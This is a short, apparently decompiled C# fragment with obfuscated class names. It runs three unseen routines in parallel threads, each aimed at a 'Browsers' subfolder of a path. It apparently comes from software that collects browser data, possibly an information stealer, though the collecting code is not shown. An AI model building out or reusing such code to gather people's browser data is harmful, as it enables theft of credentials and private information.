using System;
using System.Collections.Generic;
using System.Threading;

internal class Class57
{
	public static void smethod_0()
	{
		string zxczxc = Class38.string_11;
		List<Thread> list = new List<Thread>();
		try
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				Class88.smethod_0(zxczxc + "\\Browsers");
				Class82.smethod_0(zxczxc + "\\Browsers");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Class76.smethod_0(zxczxc + "\\Browsers");
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
